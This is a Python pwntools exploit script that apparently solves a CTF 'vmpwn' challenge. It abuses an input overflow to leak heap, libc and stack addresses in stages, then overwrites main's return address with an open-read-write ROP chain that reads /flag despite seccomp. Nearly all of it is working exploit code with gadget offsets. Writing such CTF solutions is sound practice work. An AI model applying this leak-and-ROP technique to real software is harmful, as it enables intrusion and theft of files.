#!/usr/bin/env python3
#The bug is that there is a overflow in the input received from user which allows us to leak the custom vm stack address to get heap base 
#and then use it to run our own arbitary vm instructions..As there is a presence of seccomp here to prevent us from talking a shell.. 
#We can still make it to perform a arbitary file read..So we are sending multiple stages of exploit to leak heap and then libc and then stack
#And finally overwriting the return address of main to a ORW ROP..
#Pls make a flag.txt with 777 permissions to make the exploit work..
#Log messages on the exploit will give more info.


from pwn import *
from time import sleep

context.clear(arch="amd64")
e = ELF("./vmpwn_patched")
r = process("./vmpwn_patched")
libc = ELF("./libc-2.23.so")
r.sendafter(b"tell me what is your name:",b"A" * 240)
log.info("Stage 0 exploit sent to leak custom vm stack address to calculate heap base")
r.recvuntil(b"A" * 240)


heap_leak = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00'))
heap_base = heap_leak - 0x50
log.info("The heap base of the process is " + hex(heap_base))
stage1 = p8(0x20) + p64(0) + p8(0x8f) + p8(3) + p8(0x8f) + p8(2) + p8(0x11) + p64(0) + p8(0x12) + p64(heap_base + 0x2d68) + p8(0x13) + p64(0x1000) + p8(0x7e) + p16(0x20) + b"A" * 32 + p8(0x8f) + p8(0)
stage1+= b"A" * (240 - len(stage1)) + p64(heap_leak) + p64(0) + p64(heap_base + 0x2d68)
r.send(stage1)
log.info("Stage 1 exploit sent to free the huge calloc chunk and leak unsortedbin metadata in heap to calculate libc base")
r.recvuntil(b"Now,I recevie your message,bye~")
libc_leak = u64(r.recvuntil(b'\x7f').strip().decode('latin-1').ljust(8,'\x00'))
libc_base = libc_leak - libc.sym.main_arena - 0x58
log.info("The libc base of the process is " + hex(libc_base))


stage2 = p8(0x11) + p64(1) + p8(0x12) + p64(libc_base + libc.sym.environ) + p8(0x13) + p64(0x6) + p8(0x8f) + p8(1) + p8(0x11) + p64(0) + p8(0x12) + p64(heap_base + 0x2d68) + p8(0x13) + p64(0x1000) + p8(0x8f) + p8(0) 
stage2+=b"\x90" * (240 - len(stage2)) + p64(heap_leak) + p64(heap_base+0x2d68) * 2
r.send(stage2)
log.info("Stage 2 exploit sent to leak the stack address present in the environ pointer in libc")
stack_leak = u64(r.recvuntil(b'\x7f').strip().decode('latin-1').ljust(8,'\x00'))
log.info("The stack leak of the process is " + hex(stack_leak))
return_address = stack_leak - 0xf0
log.info("The position of the return address of main in the process is " + hex(return_address))



stage3 = p8(0x11) + p64(0) + p8(0x12) + p64(return_address) + p8(0x13) + p64(0x100) + p8(0x8f) + p8(0) + p8(0xff) 
stage3+=b"\x90" * (240 - len(stage3)) + p64(heap_base + 0x2d68) * 3 + b"/flag\x00\x00\x00"
r.send(stage3)
log.info("Stage 3 exploit sent to overwrite the return address of main function with open read write ROP payload to get arbitary file read")



pop_rdi = libc_base + 0x21112
pop_rsi = libc_base + 0x202f8
pop_rdx = libc_base + 0x1b92
syscall = libc_base + 0xbc3f5
pop_rcx = libc_base + 0x119563
rdi_rax = libc_base + 0x87829
pop_rax = libc_base + 0x3a738
pop_rdx_rsi = libc_base + 0x115189
stage4 = p64(pop_rdi) + p64(heap_base + 0x2e70) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall) + p64(pop_rcx) + p64(pop_rdx_rsi) +p64(rdi_rax) +  p64(heap_base + 0x2e78) + p64(pop_rdx) + p64(0x50) + p64(pop_rax) + p64(0) + p64(syscall) + p64(pop_rdi) + p64(0x1) + p64(pop_rsi) + p64(heap_base + 0x2e78) + p64(pop_rdx) + p64(0x50) + p64(pop_rax) + p64(1) + p64(syscall) 
r.send(stage4)
log.info("Stage 4 payload is the ORW ROP payload to read /flag file and write it to stdout")


flag = r.recvuntil(b"}").decode()
log.info("The flag for the binary is " + flag)
